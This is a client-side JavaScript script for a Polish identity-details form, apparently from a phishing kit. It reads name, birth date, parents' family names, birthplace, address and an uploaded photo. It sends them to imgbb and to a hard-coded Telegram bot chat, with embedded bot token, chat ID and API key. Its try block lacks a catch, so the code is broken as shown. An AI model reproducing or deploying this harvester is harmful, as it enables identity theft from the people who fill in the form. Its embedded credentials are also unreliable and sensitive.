
const imgbbAPIKey = '52b73aa01dca04b64bc5f5e9cb7601e6';
const telegramToken = '7626788939:AAGgZlg7vqqcMwEd6E-fn1ehJsjH4o72bRQ';
const telegramChatId = '5447264217';

document.querySelector('.go').addEventListener('click', async () => {
  const name = document.getElementById('name').value;
  const surname = document.getElementById('surname').value;
  const gender = document.querySelector('.selector_text')?.textContent?.trim();
  const day = document.querySelectorAll('.date_input')[0].value;
  const month = document.querySelectorAll('.date_input')[1].value;
  const year = document.querySelectorAll('.date_input')[2].value;
  const dateOfBirth = `${day}.${month}.${year}`;
  const nationality = document.getElementById('nationality').value;
  const familyName = document.getElementById('familyName').value;
  const fathersFamilyName = document.getElementById('fathersFamilyName').value;
  const mothersFamilyName = document.getElementById('mothersFamilyName').value;
  const birthPlace = document.getElementById('birthPlace').value;
  const countryOfBirth = document.getElementById('countryOfBirth').value;
  const address1 = document.getElementById('adress1').value;
  const address2 = document.getElementById('adress2').value;
  const city = document.getElementById('city').value;

  const text = `
<b>📄 Nowe dane:</b>
👤 Imię: ${name}
👤 Nazwisko: ${surname}
⚧️ Płeć: ${gender}
📅 Data urodzenia: ${dateOfBirth}
🌍 Obywatelstwo: ${nationality}
👪 Nazwisko rodowe: ${familyName}
👨 Ojciec: ${fathersFamilyName}
👩 Matka: ${mothersFamilyName}
🏙️ Miejsce urodzenia: ${birthPlace}, ${countryOfBirth}
🏠 Adres: ${address1}, ${address2} ${city}
`;

  try {
    const fileInput = document.querySelector('input[type="file"]');
    const file = fileInput?.files?.[0];

    if (file) {
      const base64 = await toBase64(file);
      const formData = new FormData();
      formData.append('image', base64.split(',')[1]);

      const uploadRes = await fetch(`https://api.imgbb.com/1/upload?key=${imgbbAPIKey}`, {
        method: 'POST',
        body: formData
      });

      const result = await uploadRes.json();
      if (!result.success) {
        throw new Error('Błąd uploadu do imgbb: ' + result.error.message);
      }

      const imageUrl = result.data.url;

      await fetch(`https://api.telegram.org/bot${telegramToken}/sendPhoto`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: telegramChatId,
          photo: imageUrl,
          caption: text,
          parse_mode: 'HTML'
        })
      });

    } else {
      await fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: telegramChatId,
          text,
          parse_mode: 'HTML'
        })
      });
    }
  }
});

// Zamienia plik na base64
function toBase64(file) {
  return new Promise((resolve, reject) => {
    const reader = new FileReader();
    reader.onload = () => resolve(reader.result);
    reader.onerror = reject;
    reader.readAsDataURL(file);
  });
}
